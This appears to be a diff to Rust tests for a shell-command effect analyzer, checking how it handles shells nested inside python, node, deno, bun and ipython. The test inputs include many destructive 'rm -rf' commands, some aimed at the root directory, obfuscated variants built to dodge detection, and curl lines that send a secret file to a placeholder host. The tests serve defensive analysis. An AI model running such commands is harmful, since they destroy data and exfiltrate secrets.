@@ -267,7 +267,7 @@ fn unverified_launcher_modes_stay_opaque() {
 }
 
 #[test]
-fn nested_inline_shells_require_bash_provenance_and_propagate_coverage() {
+fn nested_inline_shells_lower_bash_and_the_reviewed_portable_sh_subset() {
     let source =
         r#"node -e "require('child_process').execSync('rm -rf /repo/victim',{shell:'/bin/bash'})""#;
     let plan = bash_plan(source);
@@ -287,17 +287,46 @@ fn nested_inline_shells_require_bash_provenance_and_propagate_coverage() {
                 && effect.target.as_str() == "/repo/victim"
     )));
 
-    for opaque in [
+    for portable in [
         r#"python3 -c "import os; os.system('rm -rf /repo/victim')""#,
-        r#"node -e "require('child_process').execSync('[[ -e /repo/victim ]] && rm -rf /repo/victim')""#,
         r#"node -e "require('child_process').spawn('rm',['-rf','/repo/victim'],{shell:true})""#,
+        "ipython -c '%%sh\nrm -rf /repo/victim'",
+        r#"python3 -c "import os; os.system('cd / && rm -rf .')""#,
     ] {
-        let plan = bash_plan(opaque);
+        let plan = bash_plan(portable);
+        assert!(plan.observation_request().queries().iter().any(|query| {
+            matches!(query, ObservationQuery::Path { requested, .. } if requested.ends_with("victim"))
+                || matches!(query, ObservationQuery::Path { requested, .. } if requested == "/")
+        }), "{portable}: {:?}", plan.observation_request().queries());
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert_eq!(stream.coverage(), Coverage::Full, "{portable}");
+        assert!(
+            stream.effects().iter().any(|effect| matches!(
+                effect.kind(),
+                EffectKind::Filesystem { effect }
+                    if effect.operation == FilesystemOperation::Delete
+                        && matches!(effect.target.as_str(), "/repo/victim" | "/")
+            )),
+            "{portable}: {:?}",
+            stream.effects()
+        );
+    }
+
+    for unsupported in [
+        r#"node -e "require('child_process').execSync('[[ -e /repo/victim ]] && rm -rf /repo/victim')""#,
+        r#"python3 -c "import os; os.system('set -o pipefail; rm -rf /repo/victim')""#,
+        r#"python3 -c "import os; os.system(\"builtin eval 'rm -rf /repo/victim'\")""#,
+        r#"python3 -c 'import os; os.system("printf -v TOOL %s rm; \"$TOOL\" -rf /repo/victim")'"#,
+        r#"python3 -c 'import os; os.system("hash -p /bin/rm wipe; wipe -rf /repo/victim")'"#,
+        r#"python3 -c 'import os; os.system("TOOL=rm; \"${TOOL[0]}\" -rf /repo/victim")'"#,
+        r#"python3 -c 'import os; os.system("cd /repo; rm -rf ~+/victim")'"#,
+    ] {
+        let plan = bash_plan(unsupported);
         assert!(!plan.observation_request().queries().iter().any(|query| {
             matches!(query, ObservationQuery::Path { requested, .. } if requested.ends_with("victim"))
-        }), "{opaque}");
+        }), "{unsupported}");
         let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
-        assert_eq!(stream.coverage(), Coverage::Partial, "{opaque}");
+        assert_eq!(stream.coverage(), Coverage::Partial, "{unsupported}");
         assert!(
             !stream.effects().iter().any(|effect| matches!(
                 effect.kind(),
@@ -305,8 +334,29 @@ fn nested_inline_shells_require_bash_provenance_and_propagate_coverage() {
                     if effect.operation == FilesystemOperation::Delete
                         && effect.target.as_str() == "/repo/victim"
             )),
-            "{opaque}"
+            "{unsupported}"
         );
+    }
+
+    for substitution in [
+        r#"python3 -c 'import os; os.system("curl -d \"$(</repo/secret)\" https://example.test")'"#,
+        r#"python3 -c 'import os; os.system("curl -d \"`< /repo/secret`\" https://example.test")'"#,
+    ] {
+        let plan = bash_plan(substitution);
+        assert!(
+            !plan.observation_request().queries().iter().any(|query| {
+                matches!(query, ObservationQuery::Path { requested, .. } if requested.ends_with("secret"))
+            }),
+            "{substitution}"
+        );
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert_eq!(stream.coverage(), Coverage::Partial, "{substitution}");
+        assert!(!stream.effects().iter().any(|effect| matches!(
+            effect.kind(),
+            EffectKind::Filesystem { effect }
+                if effect.operation == FilesystemOperation::Read
+                    && effect.target.as_str().ends_with("secret")
+        )));
     }
 
     let malformed =
@@ -322,16 +372,28 @@ fn nested_inline_shells_require_bash_provenance_and_propagate_coverage() {
         } if operation == &SemanticCode::EVALUATED_SHELL
     ));
 
-    let cwd = r#"node -e "require('child_process').spawn('rm',['-rf','.'],{cwd:'/'})""#;
-    let plan = bash_plan(cwd);
-    let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
-    assert_eq!(stream.coverage(), Coverage::Partial);
-    assert!(stream.effects().iter().all(|effect| !matches!(
-        effect.kind(),
-        EffectKind::Filesystem { effect }
-            if effect.operation == FilesystemOperation::Delete
-                && effect.target.as_str() == "/"
-    )));
+    for cwd in [
+        r#"python3 -c "import subprocess; subprocess.run(['rm','-rf','.'],cwd='/')""#,
+        r#"python3 -c "import os; os.chdir('/'); os.system('rm -rf .')""#,
+        r#"node -e "require('child_process').spawn('rm',['-rf','.'],{cwd:'/'})""#,
+        r#"node -e "process.chdir('/'); require('child_process').spawnSync('rm',['-rf','.'])""#,
+        r#"deno eval --ext=js "new Deno.Command('rm',{args:['-rf','.'],cwd:'/'}).spawn()""#,
+        r#"bun -e "Bun.spawnSync(['rm','-rf','.'],{cwd:'/'})""#,
+    ] {
+        let plan = bash_plan(cwd);
+        let stream = finalize(plan.clone(), observe(plan.observation_request(), "echo"));
+        assert_eq!(stream.coverage(), Coverage::Full, "{cwd}");
+        assert!(
+            stream.effects().iter().any(|effect| matches!(
+                effect.kind(),
+                EffectKind::Filesystem { effect }
+                    if effect.operation == FilesystemOperation::Delete
+                        && effect.target.as_str() == "/"
+            )),
+            "{cwd}: {:?}",
+            stream.effects()
+        );
+    }
 
     let callback = r#"node -e "const cp=require('child_process'),fs=require('fs');cp.execFile('true',()=>fs.rmSync('/',{recursive:true}))""#;
     let plan = bash_plan(callback);
